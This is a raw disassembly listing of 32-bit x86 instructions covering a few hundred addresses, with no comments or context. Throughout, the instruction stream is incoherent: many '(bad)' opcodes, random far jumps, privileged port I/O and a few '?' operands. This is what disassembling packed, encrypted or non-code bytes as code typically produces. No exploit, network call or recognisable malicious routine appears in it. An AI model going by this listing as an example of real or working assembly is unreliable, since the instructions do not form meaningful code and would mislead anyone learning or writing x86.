  41f597:	cmp    WORD PTR [esi],sp
  41f59a:	ret    0x44f
  41f59d:	inc    edi
  41f59e:	je     0x41f5e3
  41f5a0:	and    bh,0x50
  41f5a3:	popa   
  41f5a4:	rol    DWORD PTR [esi+0x42],1
  41f5a7:	mov    bl,0xa4
  41f5a9:	inc    esi
  41f5aa:	xor    al,0xd5
  41f5ac:	mov    cl,0x57
  41f5ae:	loopne 0x41f55b
  41f5b0:	xchg   ebp,eax
  41f5b1:	fnstenv [esi+ecx*8]
  41f5b4:	or     DWORD PTR [ebp+0x75],ebx
  41f5b7:	xor    BYTE PTR [esi],0x24
  41f5ba:	cli    
  41f5bb:	retf   
  41f5bc:	fsubrp st(7),st
  41f5be:	jae    0x41f5a3
  41f5c0:	bound  ebp,QWORD PTR [ecx+0x3a]
  41f5c3:	imul   edx,DWORD PTR [ebp+0x1dafb88d],0x82a7beb6
  41f5cd:	aad    0x3b
  41f5cf:	pusha  
  41f5d0:	push   ds
  41f5d1:	or     DWORD PTR [esi+0x1dd96f96],esi
  41f5d7:	leave  
  41f5d8:	mov    esi,0x1b3f2bc4
  41f5dd:	in     eax,0x21
  41f5df:	(bad)  
  41f5e0:	mov    DWORD PTR cs:[edx-0x5c315a88],eax
  41f5e7:	dec    edi
  41f5e8:	pushf  
  41f5e9:	fcos   
  41f5eb:	xchg   edi,eax
  41f5ec:	add    eax,0xd8a5d828
  41f5f1:	repnz xlat BYTE PTR ds:[ebx]
  41f5f3:	pop    ss
  41f5f4:	sub    ebp,DWORD PTR [ebx+0x106cf3c4]
  41f5fa:	rol    dl,1
  41f5fc:	das    
  41f5fd:	mov    ch,0x26
  41f5ff:	dec    edx
  41f600:	add    DWORD PTR [edi-0x32],ebp
  41f603:	or     BYTE PTR [edx],ah
  41f605:	cmp    cl,dh
  41f607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f608:	sbb    al,0x27
  41f60a:	mov    gs,WORD PTR [ebx]
  41f60c:	and    al,0x87
  41f60e:	push   ebp
  41f60f:	sbb    bl,BYTE PTR [ebp+ebp*2+0xb]
  41f613:	push   esp
  41f614:	xor    al,0x74
  41f616:	and    esi,DWORD PTR [eax]
  41f618:	enter  0x3ecc,0xcf
  41f61c:	push   0x3f
  41f61e:	add    ebp,ecx
  41f620:	jnp    0x41f5f7
  41f622:	mov    cl,0x8b
  41f624:	mov    ds:0x50906a5d,al
  41f629:	imul   BYTE PTR [esi]
  41f62b:	pop    edx
  41f62c:	popf   
  41f62d:	mov    ch,0xb6
  41f62f:	imul   esp,eax,0xd0afa638
  41f635:	inc    ebx
  41f636:	sub    al,0xc5
  41f638:	sbb    bh,BYTE PTR [eax-0x337e5134]
  41f63e:	mov    WORD PTR [esi+edx*8+0x31],cs
  41f642:	xor    ebp,ecx
  41f644:	outs   dx,DWORD PTR ds:[esi]
  41f645:	lea    ebx,[edi]
  41f647:	test   eax,0x9434e86c
  41f64c:	fcom   DWORD PTR [ecx+0x6f9fe8db]
  41f652:	les    eax,FWORD PTR [edx]
  41f654:	push   ebp
  41f655:	out    0x1e,al
  41f657:	jmp    DWORD PTR [ecx-0x2]
  41f65a:	loopne 0x41f69b
  41f65c:	iret   
  41f65d:	dec    BYTE PTR [eax]
  41f65f:	hlt    
  41f660:	pop    ss
  41f661:	or     eax,0xb717fbfe
  41f666:	leave  
  41f667:	jmp    0x41f622
  41f669:	mov    ecx,0x27b87611
  41f66e:	pop    eax
  41f66f:	repnz hlt 
  41f671:	sbb    al,0xbe
  41f673:	and    DWORD PTR [ebx+0x3c1d3323],edi
  41f679:	adc    bh,dl
  41f67b:	dec    esp
  41f67c:	dec    eax
  41f67d:	pop    edi
  41f67e:	(bad)  
  41f67f:	push   edx
  41f680:	arpl   WORD PTR [esp+ecx*8],bp
  41f683:	call   0xbef7:0xfa738c4f
  41f68a:	iret   
  41f68b:	jl     0x41f706
  41f68d:	std    
  41f68e:	in     al,0xcd
  41f690:	mov    edi,0x7ee24c69
  41f695:	mov    eax,0x68b2af88
  41f69a:	or     dh,BYTE PTR [esi+edi*1]
  41f69d:	test   ebp,ecx
  41f69f:	or     bl,al
  41f6a1:	xor    ebp,DWORD PTR [ebp-0x2c]
  41f6a4:	in     al,dx
  41f6a5:	es pop esp
  41f6a7:	cdq    
  41f6a8:	hlt    
  41f6a9:	adc    eax,0x2db19614
  41f6ae:	(bad)  
  41f6af:	nop
  41f6b0:	lea    eax,[ebp+0x36]
  41f6b3:	adc    eax,0x6eed8653
  41f6b8:	scas   al,BYTE PTR es:[edi]
  41f6b9:	mov    ebx,0x3a8d5dbe
  41f6be:	pushf  
  41f6bf:	push   ds
  41f6c0:	xchg   ah,al
  41f6c2:	and    DWORD PTR [ebx],ebp
  41f6c4:	adc    BYTE PTR [esp+eax*4+0x6d],dh
  41f6c8:	or     eax,0x6f0c4688
  41f6cd:	jbe    0x41f67a
  41f6cf:	xor    BYTE PTR [edi],0xd5
  41f6d2:	or     al,0x58
  41f6d4:	sub    eax,DWORD PTR [edi+ebp*4+0x22]
  41f6d8:	xchg   edx,eax
  41f6d9:	sbb    DWORD PTR [ebx+edx*1],0xffffffb0
  41f6dd:	jnp    0x41f75b
  41f6df:	ror    bh,0x17
  41f6e2:	xor    ebp,esi
  41f6e4:	outs   dx,BYTE PTR ds:[esi]
  41f6e5:	mov    ds:0x6b5f2cc6,eax
  41f6ea:	xor    bl,ah
  41f6ec:	add    eax,0xfb01c74c
  41f6f1:	or     BYTE PTR [ecx+ebx*8],cl
  41f6f4:	gs pop ss
  41f6f6:	dec    esp
  41f6f7:	popf   
  41f6f8:	xor    ah,BYTE PTR [ebx]
  41f6fa:	and    DWORD PTR [esi],0xb9ada21b
  41f700:	sbb    DWORD PTR [ebx-0x5f7898c],edx
  41f706:	retf   0xdf4f
  41f709:	fs popa 
  41f70b:	pop    ds
  41f70c:	add    al,0x72
  41f70e:	std    
  41f70f:	sub    DWORD PTR [ecx-0x6b],ebp
  41f712:	dec    edi
  41f713:	nop
  41f714:	scas   eax,DWORD PTR es:[edi]
  41f715:	inc    ebp
  41f716:	mov    esp,0x8e38e7a1
  41f71b:	or     al,0x3
  41f71d:	dec    esp
  41f71e:	or     eax,0xe44aec5d
  41f723:	ds in  al,0xc8
  41f726:	mov    cl,bh
  41f728:	cwde   
  41f729:	daa    
  41f72a:	(bad)  [ebp+0x57]
  41f72d:	fwait
  41f72e:	push   ecx
  41f72f:	mov    esi,0xf8eba6c
  41f734:	and    al,0xc0
  41f736:	pop    ebx
  41f737:	repnz enter 0x1ed6,0xf2
  41f73c:	inc    ebx
  41f73d:	xchg   esi,eax
  41f73e:	(bad)  
  41f73f:	aad    0x6a
  41f741:	fadd   QWORD PTR [ebp-0x15]
  41f744:	lds    edi,FWORD PTR [esp+ebx*2]
  41f747:	retf   0x8413
  41f74a:	or     BYTE PTR [edx+0x45],cl
  41f74d:	xchg   DWORD PTR [edx+edx*1-0x1c785572],esp
  41f754:	xor    ch,cl
  41f756:	pop    ebp
  41f757:	jmp    0xb6ab:0xbef3d289
  41f75e:	xor    BYTE PTR [edx],dh
  41f760:	push   ebx
  41f761:	sub    ch,BYTE PTR [ecx]
  41f763:	ret    0x9508
  41f766:	inc    edx
  41f767:	imul   eax,DWORD PTR [edi+0x6b],0xfffffffd
  41f76b:	inc    eax
  41f76c:	int    0xfc
  41f76e:	cmc    
  41f76f:	sub    cl,BYTE PTR [esi]
  41f771:	call   0x4590:0x10a70e4e
  41f778:	xchg   DWORD PTR [ecx],esp
  41f77a:	inc    edx
  41f77b:	loopne 0x41f7ca
  41f77d:	push   0xf6cfb0ab
  41f782:	mov    ecx,0x160d29d5
  41f787:	dec    esi
  41f788:	daa    
  41f789:	mov    eax,DWORD PTR [edx+ebp*2]
  41f78c:	cli    
  41f78d:	sub    dh,al
  41f78f:	pop    ds
  41f790:	iret   
  41f791:	(bad)  
  41f792:	adc    BYTE PTR [edi-0x4d],dl
  41f795:	or     ch,al
  41f797:	fiadd  DWORD PTR [edi+0x2f]
  41f79a:	test   BYTE PTR [ebx-0x4a9ddf5c],ch
  41f7a0:	inc    edi
  41f7a1:	cmp    DWORD PTR [ebp+0x6931b635],eax
  41f7a7:	add    BYTE PTR [esi],dl
  41f7a9:	jno    0x41f7e0
  41f7ab:	loope  0x41f7be
  41f7ad:	aaa    
  41f7ae:	(bad)  
  41f7af:	pop    ss
  41f7b0:	mov    dl,0x1
  41f7b2:	stos   DWORD PTR es:[edi],eax
  41f7b3:	ja     0x41f756
  41f7b5:	xor    dh,dl
  41f7b7:	in     al,dx
  41f7b8:	mov    al,0x3d
  41f7ba:	ja     0x41f7a7
  41f7bc:	fld    QWORD PTR [eax-0x650b94d4]
  41f7c2:	outs   dx,DWORD PTR ds:[esi]
  41f7c3:	sbb    ebx,DWORD PTR [edi+0x54]
  41f7c6:	jp     0x41f7ae
  41f7c8:	push   esi
  41f7c9:	fsub   DWORD PTR [edi+0xe570392]
  41f7cf:	pop    ebx
  41f7d0:	dec    ebx
  41f7d1:	repnz mov esp,0x74b5717c
  41f7d7:	xor    al,bl
  41f7d9:	fs std 
  41f7db:	xor    esp,eax
  41f7dd:	mov    ecx,0xebc7ba8a
  41f7e2:	repz mov ss,WORD PTR [eax+0x21]
  41f7e6:	push   esp
  41f7e7:	fstp   TBYTE PTR [edi+0x27]
  41f7ea:	ss mov ah,0xf5
  41f7ed:	xor    eax,0x78
  41f7f0:	nop
  41f7f1:	dec    esi
  41f7f2:	cmp    DWORD PTR [esi+edi*8-0x24],eax
  41f7f6:	shl    BYTE PTR [ecx],cl
  41f7f8:	jl     0x41f7c6
  41f7fa:	push   cs
  41f7fb:	jmp    0x5c690923
  41f800:	addr16 pop ecx
  41f802:	and    esp,ebp
  41f804:	fcmovnbe st,st(4)
  41f806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f807:	les    edx,FWORD PTR [esp+ebx*8+0x33586ec9]
  41f80e:	or     esi,DWORD PTR [esi]
  41f810:	sbb    eax,esp
  41f812:	enter  0xdba6,0xac
  41f816:	dec    ebp
  41f817:	cmp    eax,0xe651105a
  41f81c:	mov    WORD PTR [ebp+0x77],fs
  41f81f:	ss sbb eax,0x85a57e23
  41f825:	mov    ebp,ecx
  41f827:	js     0x41f7c2
  41f829:	(bad)  
  41f82a:	shl    DWORD PTR [edx+0x699b4bdd],1
  41f830:	push   ebp
  41f831:	cdq    
  41f832:	sbb    BYTE PTR [esi],0x67
  41f835:	out    0x27,eax
  41f837:	popa   
  41f838:	xor    al,BYTE PTR [eax]
  41f83a:	push   ecx
  41f83b:	mov    ecx,0xf0db8352
  41f840:	mov    esi,0x97cbceaf
  41f845:	or     dh,BYTE PTR [ebx-0x1c]
  41f848:	(bad)  
  41f849:	int    0x46
  41f84b:	dec    ebx
  41f84c:	dec    eax
  41f84d:	push   ecx
  41f84e:	xlat   BYTE PTR ds:[ebx]
  41f84f:	(bad)  
  41f850:	sbb    BYTE PTR [eax+edi*1],dl
  41f853:	scas   eax,DWORD PTR es:[edi]
  41f854:	(bad)  
  41f856:	adc    DWORD PTR [ebx+0x6a],ebx
  41f859:	jo     0x41f89f
  41f85b:	ss scas al,BYTE PTR es:[edi]
  41f85d:	lods   eax,DWORD PTR ds:[esi]
  41f85e:	add    edi,ebp
  41f860:	jp     0x41f870
  41f862:	xor    BYTE PTR [edx],0x4a
  41f865:	pinsrw mm4,WORD PTR [esi+0x1ef2003c],0xc6
  41f86d:	jg     0x41f837
  41f86f:	inc    edi
  41f870:	adc    eax,0xc3bbe6b6
  41f875:	adc    DWORD PTR ds:0xae7986fc,edi
  41f87b:	mov    ch,0xa9
  41f87d:	mov    edi,0x93dc291c
  41f882:	fsub   QWORD PTR [esi-0x3921987b]
  41f888:	push   eax
  41f889:	adc    dl,BYTE PTR [ebx-0x6f3e09cd]
  41f88f:	mov    ds:0xe654e519,eax
  41f894:	loop   0x41f862
  41f896:	mov    edx,0xd2466e98
  41f89b:	jno    0x41f8d0
  41f89d:	mov    bh,0x59
  41f89f:	and    cl,cl
  41f8a1:	pop    ecx
  41f8a2:	ins    DWORD PTR es:[edi],dx
  41f8a3:	adc    bh,BYTE PTR [eax+0x32]
  41f8a6:	push   eax
  41f8a7:	adc    eax,0xb45533ee
  41f8ac:	jmp    0x2ba0:0xfabcb161
  41f8b3:	pop    ebp
  41f8b4:	gs stc 
  41f8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8b7:	(bad)  
  41f8b8:	aam    0xb1
  41f8ba:	sub    DWORD PTR ds:0xd66aac0c,ecx
  41f8c0:	xchg   ebp,eax
  41f8c1:	mov    eax,0x8ef43d79
  41f8c6:	mov    al,ds:0x777fa730
  41f8cb:	jmp    0x4a55:0xd0375de4
  41f8d2:	push   ds
  41f8d3:	daa    
  41f8d4:	test   BYTE PTR [eax-0x3b],dh
  41f8d7:	sub    eax,0x4529a83
  41f8dc:	pop    esi
  41f8dd:	push   ebx
  41f8de:	push   eax
  41f8df:	sub    DWORD PTR [edx],0xea04eb65
  41f8e5:	sbb    eax,DWORD PTR [esi+0x74]
  41f8e8:	imul   esi,DWORD PTR [edx+0x780007d4],0x13
  41f8ef:	(bad)  
  41f8f0:	mov    bl,0x3c
  41f8f2:	adc    al,0xf0
  41f8f4:	in     al,0xbf
  41f8f6:	(bad)  
  41f8f7:	in     al,0x89
  41f8f9:	push   ebx
  41f8fa:	movsx  edi,al
  41f8fd:	(bad)  
  41f8fe:	into   
  41f8ff:	loop   0x41f964
  41f901:	cdq    
  41f902:	xor    ah,BYTE PTR [eax]
  41f904:	rcl    DWORD PTR ds:0xf206138e,1
  41f90a:	dec    ebx
  41f90b:	cmp    al,0x51
  41f90d:	(bad)  
  41f90f:	sti    
  41f910:	xchg   esi,eax
  41f911:	and    eax,0x9aac6e27
  41f916:	sbb    esp,DWORD PTR [ebx-0x2d]
  41f919:	mov    ch,0xbf
  41f91b:	adc    eax,DWORD PTR [esi-0x195dccf]
  41f921:	iret   
  41f922:	loop   0x41f8db
  41f924:	dec    esi
  41f925:	jb     0x41f938
  41f927:	cmp    al,0xa9
  41f929:	stos   DWORD PTR es:[edi],eax
  41f92a:	std    
  41f92b:	shl    BYTE PTR [edi+0xa],0xb2
  41f92f:	aaa    
  41f930:	call   0x2ba73203
  41f935:	jge    0x41f974
  41f937:	sub    ecx,ebp
  41f939:	mov    al,ds:0x6097b290
  41f93e:	or     eax,0xa2cda9d5
  41f943:	arpl   WORD PTR [ebx],bx
  41f945:	ja     0x41f8fa
  41f947:	div    DWORD PTR [ebx]
  41f949:	(bad)  
  41f94a:	call   0xfb4e0950
  41f94f:	jno    0x41f8ff
  41f951:	in     eax,0x7
  41f953:	pop    ss
  41f954:	pop    eax
  41f955:	jge    0x41f9a2
  41f957:	(bad)  
  41f958:	ins    BYTE PTR es:[edi],dx
  41f959:	add    DWORD PTR [edi-0x52aa6f78],0x4d5495c8
  41f963:	jge    0x41f9a8
  41f965:	dec    esi
  41f966:	jle    0x41f98f
  41f968:	push   eax
  41f969:	mov    ecx,0x111c646
  41f96e:	mov    al,ds:0xd6fd144a
  41f973:	mov    ds:0xb6b343c5,eax
  41f978:	push   cs
  41f979:	push   ecx
  41f97a:	aam    0x1a
  41f97c:	sbb    bh,dh
  41f97e:	cmp    DWORD PTR [eax],0x24202185
  41f984:	jp     0x41f948
  41f986:	ds (bad) 
  41f988:	imul   edi,DWORD PTR [ebx+0xb],0x7f
  41f98c:	adc    ecx,DWORD PTR [ecx-0x7]
  41f98f:	add    cl,BYTE PTR [edx]
  41f991:	mov    al,ds:0x62399c95
  41f996:	jg     0x41f9e3
  41f998:	add    DWORD PTR [edi],ebx
  41f99a:	(bad)  
  41f99c:	mov    bl,0x49
  41f99e:	inc    ecx
  41f99f:	test   eax,0x581da7de
  41f9a4:	cmp    ebx,DWORD PTR [edi]
  41f9a6:	inc    esp
  41f9a7:	(bad)  
  41f9a9:	cmp    al,0xe6
  41f9ab:	es mov al,ch
  41f9ae:	fwait
  41f9af:	pop    es
  41f9b0:	sbb    eax,0xa8029019
  41f9b5:	mov    ecx,edi
  41f9b7:	clc    
  41f9b8:	xchg   ecx,eax
  41f9b9:	pop    eax
  41f9ba:	and    esi,edi
  41f9bc:	adc    eax,0xb3b31586
  41f9c1:	rcl    esi,cl
  41f9c3:	push   ebp
  41f9c4:	push   edx
  41f9c5:	mov    eax,0x2f6c8889
  41f9ca:	jns    0x41f9f2
  41f9cc:	inc    ebx
  41f9cd:	scas   eax,DWORD PTR es:[edi]
  41f9ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9cf:	int3   
  41f9d0:	inc    edi
  41f9d1:	fiadd  DWORD PTR [ebp+0x65f7453f]
  41f9d7:	ret    0x6aa
  41f9da:	sbb    al,0x51
  41f9dc:	adc    eax,0x851efde8
  41f9e1:	mov    edx,0xaf8a1226
  41f9e6:	int3   
  41f9e7:	imul   esi,DWORD PTR [eax],0xc49616e3
  41f9ed:	lods   eax,DWORD PTR ds:[esi]
  41f9ee:	or     eax,0x40452b89
  41f9f3:	ins    BYTE PTR es:[edi],dx
  41f9f4:	sub    edi,0xa00ae856
  41f9fa:	data16 fild WORD PTR [esi-0x7e]
  41f9fe:	mov    WORD PTR [ecx],ds
  41fa00:	dec    ecx
  41fa01:	outs   dx,BYTE PTR ds:[esi]
  41fa02:	repz mov ebx,0x218c078b
  41fa08:	sub    DWORD PTR [ebp+0x46d8d223],edi
  41fa0e:	pop    edx
  41fa0f:	fld    TBYTE PTR ds:0xb0860e1e
  41fa15:	aad    0x63
  41fa17:	fldcw  WORD PTR [ebp+0x50471f13]
  41fa1d:	and    al,0x1
  41fa1f:	mov    BYTE PTR [ebx],dl
  41fa21:	fild   DWORD PTR [ebx-0x64]
  41fa24:	inc    edi
  41fa25:	pop    edx
  41fa26:	(bad)  
  41fa27:	nop
  41fa28:	cdq    
  41fa29:	test   DWORD PTR [ebx+0x2d],ebp
  41fa2c:	mov    bh,0x7d
  41fa2e:	je     0x41fa62
  41fa30:	popf   
  41fa31:	dec    edx
  41fa32:	rcl    BYTE PTR [edx-0x3f],cl
  41fa35:	cmc    
  41fa36:	enter  0x83b5,0xd4
  41fa3a:	out    0x71,al
  41fa3c:	pop    es
  41fa3d:	push   ecx
  41fa3e:	daa    
  41fa3f:	dec    esp
  41fa40:	xchg   ebp,eax
  41fa41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa42:	dec    edi
  41fa43:	mov    ebp,esi
  41fa45:	fsub   st,st(3)
  41fa47:	cld    
  41fa48:	(bad)  
  41fa49:	sub    ch,ah
  41fa4b:	add    BYTE PTR [esi],ch
  41fa4d:	sbb    al,0x6e
  41fa4f:	sub    DWORD PTR [ebx+eax*2-0x26],0x87f709c8
  41fa57:	cdq    
  41fa58:	(bad)  
  41fa59:	fs xor ebx,edi
  41fa5c:	jbe    0x41fada
  41fa5e:	jbe    0x41f9e9
  41fa60:	mov    ds:0x3e4f4b68,eax
  41fa65:	adc    ah,ah
  41fa67:	inc    ebx
  41fa68:	mov    bh,0x6f
  41fa6a:	and    BYTE PTR [ebx+0x65],dh
  41fa6d:	test   esp,0xff6d835f
  41fa73:	sbb    edx,DWORD PTR [esi]
  41fa75:	push   eax
  41fa76:	rol    BYTE PTR [edx-0x289dcebf],0x34
  41fa7d:	loop   0x41faf6
  41fa7f:	jo     0x41fa70
  41fa81:	lods   eax,DWORD PTR ds:[esi]
  41fa82:	in     eax,dx
  41fa83:	fimul  DWORD PTR [ecx]
  41fa85:	add    esi,DWORD PTR [ecx+0x67]
  41fa88:	fnstcw WORD PTR [eax+0x3c]
  41fa8b:	cld    
  41fa8c:	adc    al,0x26
  41fa8e:	stc    
  41fa8f:	mov    ebp,0x20e423ed
  41fa94:	adc    BYTE PTR [edx+edx*2-0x80],0x59
  41fa99:	ret    
  41fa9a:	imul   edx,DWORD PTR [esi],0xc38da0f8
  41faa0:	(bad)  
  41faa2:	or     eax,0xc221467c
  41faa7:	jbe    0x41fa60
  41faa9:	outs   dx,DWORD PTR ds:[esi]
  41faaa:	cmp    dl,dh
  41faac:	mov    edx,0xd8a9188b
  41fab1:	jge    0x41faf1
  41fab3:	lods   eax,DWORD PTR ds:[esi]
  41fab4:	xor    al,0x2e
  41fab6:	repnz ffreep st(7)
  41fab9:	or     ebx,edi
  41fabb:	in     al,0x20
  41fabd:	cmp    al,ah
  41fabf:	jmp    0x41fa85
  41fac1:	push   0x98155fb
  41fac6:	in     al,dx
  41fac7:	mov    eax,0x1e8e0311
  41facc:	cmp    esp,DWORD PTR [edi]
  41face:	jmp    0x7b26:0x4821a336
  41fad5:	jmp    0x41fb06
  41fad7:	pop    esi
  41fad8:	add    al,0xc4
  41fada:	pop    edi
  41fadb:	dec    eax
  41fadc:	(bad)  
  41fadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fade:	xor    al,0xd3
  41fae0:	mov    ds:0x133fbf0e,eax
  41fae5:	or     eax,0x690648f9
  41faea:	add    BYTE PTR [ebx+0x5a],dl
  41faed:	dec    esp
  41faee:	fbld   TBYTE PTR [ecx+edx*2-0x1e]
  41faf2:	out    dx,al
  41faf3:	dec    edx
  41faf4:	daa    
  41faf5:	sbb    DWORD PTR [esi+0x27],edi
  41faf8:	movsx  ecx,BYTE PTR [esp+ebx*4-0x64a414cc]
  41fb00:	test   BYTE PTR [ebx-0x1e],ah
  41fb03:	dec    eax
  41fb04:	ds pop ss
  41fb06:	call   0x3376:0x83c1e5d3
  41fb0d:	add    al,0x55
  41fb0f:	sub    ebp,DWORD PTR [ecx+esi*8]
  41fb12:	lock dec esp
  41fb14:	pushf  
  41fb15:	or     ebx,edx
  41fb17:	xchg   ebp,eax
  41fb18:	push   cs
  41fb19:	xchg   edx,eax
  41fb1a:	push   ds
  41fb1b:	fdiv   DWORD PTR [esi]
  41fb1d:	sahf   
  41fb1e:	and    edi,DWORD PTR [ecx+0x65]
  41fb21:	add    ah,al
  41fb23:	or     ch,0x8e
  41fb26:	hlt    
  41fb27:	iret   
  41fb28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb29:	mov    ecx,0xa478032d
  41fb2e:	or     eax,0xb61e87cf
  41fb33:	inc    eax
  41fb34:	sbb    DWORD PTR [ecx+0x35d48fd],eax
  41fb3a:	mov    bh,0xa
  41fb3c:	je     0x41fabe
  41fb3e:	sub    al,0x9e
  41fb40:	fist   WORD PTR [eax+0x0]
  41fb43:	ins    BYTE PTR es:[edi],dx
  41fb44:	ja     0x41fb8b
  41fb46:	adc    eax,0xbb14f7a2
  41fb4b:	in     al,0xa2
  41fb4d:	or     ah,BYTE PTR [ebx+0x5c]
  41fb50:	rcl    DWORD PTR [ebx-0x65],0x4f
  41fb54:	and    al,0x5c
  41fb56:	mov    al,0xa4
  41fb58:	daa    
  41fb59:	sar    BYTE PTR [ecx],cl
  41fb5b:	cmp    edi,DWORD PTR [ebp+0x0]
  41fb5e:	jne    0x41fb3e
  41fb60:	imul   DWORD PTR [ebx+eax*1-0x42a740dd]
  41fb67:	hlt    
  41fb68:	daa    
  41fb69:	fcmove st,st(7)
  41fb6b:	sub    BYTE PTR ds:0xc6c33434,al
  41fb71:	(bad)  
  41fb72:	push   0x7
  41fb74:	lahf   
  41fb75:	scas   al,BYTE PTR es:[edi]
  41fb76:	dec    esi
  41fb77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb78:	popa   
  41fb79:	pop    ecx
  41fb7a:	sub    BYTE PTR [eax+eax*8-0x64bcb811],ch
  41fb81:	sub    esi,eax
  41fb83:	push   0xfffffffe
  41fb85:	xchg   edi,eax
  41fb87:	outs   dx,DWORD PTR ds:[esi]
  41fb88:	sbb    edi,esp
  41fb8a:	push   edi
  41fb8b:	les    ebp,FWORD PTR [esi+eiz*1-0x2cc54037]
  41fb92:	mov    esp,0xf70008f
  41fb97:	inc    ecx
  41fb98:	push   ebx
  41fb99:	(bad)  
  41fb9b:	inc    ebp
  41fb9c:	je     0x41fb22
  41fb9e:	cmp    BYTE PTR [ecx+0x3],bl
  41fba1:	jae    0x41fb58
  41fba3:	cmp    dl,BYTE PTR [ebx+edx*1]
  41fba6:	xchg   ebx,eax
  41fba7:	jl     0x41fc0e
  41fba9:	(bad)  
  41fbab:	jl     0x41fbaf
  41fbad:	jbe    0x41fbbe
  41fbaf:	retf   
  41fbb0:	dec    edx
  41fbb1:	inc    ecx
  41fbb2:	pop    esi
  41fbb3:	add    ebx,eax
  41fbb5:	mov    edx,0xff44b6d9
  41fbba:	and    ebx,esp
  41fbbc:	fs sbb ch,cl
  41fbbf:	push   ebp
  41fbc0:	fcom   DWORD PTR [esi]
  41fbc2:	das    
  41fbc3:	jp     0x41fb9c
  41fbc5:	sbb    eax,0xfc327d02
  41fbca:	adc    BYTE PTR [ebx-0x12],0xc5
  41fbce:	fs pop ebp
  41fbd0:	ins    BYTE PTR es:[edi],dx
  41fbd1:	jbe    0x41fc11
  41fbd3:	mov    ah,0x64
  41fbd5:	fucomi st,st(4)
  41fbd7:	outs   dx,DWORD PTR ds:[esi]
  41fbd8:	mov    DWORD PTR [edi-0x5eb6a71d],eax
  41fbde:	inc    ebp
  41fbdf:	fdivr  QWORD PTR fs:[edx-0x3]
  41fbe3:	repnz push cs
  41fbe5:	inc    ebx
  41fbe6:	movzx  ebx,BYTE PTR [edx+0x2c81453c]
  41fbed:	jne    0x41fc06
  41fbef:	fstp   st(1)
  41fbf1:	mov    ah,0xe1
  41fbf3:	ins    DWORD PTR es:[edi],dx
  41fbf4:	or     bl,BYTE PTR [esp+ecx*2-0x497e2954]
  41fbfb:	stos   BYTE PTR es:[edi],al
  41fbfc:	inc    ebx
  41fbfd:	jo     0x41fc3d
  41fbff:	repnz dec ecx
  41fc01:	mov    dh,0x83
  41fc03:	not    DWORD PTR [ecx-0x66470040]
  41fc09:	jp     0x41fba2
  41fc0b:	fwait
  41fc0c:	shl    DWORD PTR [ebp+0x4aa8a36a],0xfb
  41fc13:	(bad)  
  41fc14:	fild   DWORD PTR [ecx-0x35251066]
  41fc1a:	in     al,0x7c
  41fc1c:	stos   BYTE PTR es:[edi],al
  41fc1d:	dec    esi
  41fc1e:	push   eax
  41fc1f:	pop    ebx
  41fc20:	and    edx,DWORD PTR [edx+eax*2]
  41fc23:	call   0x5c6be543
  41fc28:	xchg   edi,eax
  41fc29:	fst    DWORD PTR [edx]
  41fc2b:	dec    ecx
  41fc2c:	xchg   esp,eax
  41fc2d:	push   0x8bc5dfdd
  41fc32:	mov    eax,?
  41fc34:	mov    dh,0xd7
  41fc36:	xlat   BYTE PTR ds:[ebx]
  41fc37:	and    DWORD PTR [esi+0x2c0829f],eax
  41fc3d:	jmp    0x41fc2f
  41fc3f:	mov    edx,0xe539a298
  41fc44:	sbb    BYTE PTR [eax-0x13],ah
  41fc47:	sti    
  41fc48:	scas   eax,DWORD PTR es:[edi]
  41fc49:	adc    eax,0x8cae48cd
  41fc4e:	mov    ebp,gs
  41fc50:	sub    al,0xef
  41fc52:	imul   edi,ecx,0x60
  41fc55:	out    0x24,eax
  41fc57:	push   edx
  41fc58:	jecxz  0x41fc08
  41fc5a:	fcom   DWORD PTR [esi-0x13]
  41fc5d:	and    al,0xb2
  41fc5f:	dec    ebx
  41fc60:	shl    DWORD PTR [esi-0x15],0x3d
  41fc64:	outs   dx,BYTE PTR ds:[esi]
  41fc65:	scas   eax,DWORD PTR es:[edi]
  41fc66:	ss fs in eax,0xb7
  41fc6a:	inc    edi
  41fc6b:	lods   eax,DWORD PTR ds:[esi]
  41fc6c:	push   esi
  41fc6d:	mov    ah,0x2d
  41fc6f:	iret   
  41fc70:	dec    ebx
  41fc71:	inc    edi
  41fc72:	mov    eax,cs
  41fc74:	pop    esp
  41fc75:	xor    DWORD PTR ds:0x9ebf53b4,ecx
  41fc7b:	adc    al,0xe7
  41fc7d:	add    ch,BYTE PTR [esi]
  41fc7f:	adc    DWORD PTR [ebx+ebp*4-0x25],eax
  41fc83:	xor    BYTE PTR [edi+0x29],ah
  41fc86:	fsub   st,st(2)
  41fc88:	std    
  41fc89:	xchg   edx,eax
  41fc8a:	(bad)  
  41fc8c:	pushf  
  41fc8d:	push   esp
  41fc8e:	mov    esp,0x5791a05f
  41fc93:	mov    ecx,0xa056facf
  41fc98:	in     eax,dx
  41fc99:	sar    DWORD PTR [edx],cl
  41fc9b:	sub    eax,DWORD PTR [ebp-0x15]
  41fc9e:	xchg   esp,eax
  41fc9f:	add    cl,dl
  41fca1:	das    
  41fca2:	mov    ch,0xe0
  41fca4:	pop    ds
  41fca5:	stos   BYTE PTR es:[edi],al
  41fca6:	mov    ?,WORD PTR [ebx+0x78eed7b4]
  41fcac:	pusha  
  41fcad:	sahf   
  41fcae:	div    BYTE PTR [edx+0x1a]
  41fcb1:	jno    0x41fcde
  41fcb3:	(bad)
  41fcb6:	add    ebp,DWORD PTR [eax+0x772eff29]
  41fcbc:	cwde   
  41fcbd:	sbb    edx,edx
  41fcbf:	jmp    0x53ff3955
  41fcc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcc5:	frstor [edx-0x72]
  41fcc8:	pushf  
  41fcc9:	cmp    ebp,DWORD PTR [esi-0xc873dd8]
  41fccf:	jl     0x41fc62
  41fcd1:	xor    eax,0x2b7b03ad
  41fcd6:	loope  0x41fcbc
  41fcd8:	sar    ch,cl
  41fcda:	(bad)  
  41fcdb:	fldcw  WORD PTR [eax]
  41fcdd:	dec    esi
  41fcde:	mov    al,ds:0x3e6c4f10
  41fce3:	sar    edi,cl
  41fce5:	outs   dx,BYTE PTR ds:[esi]
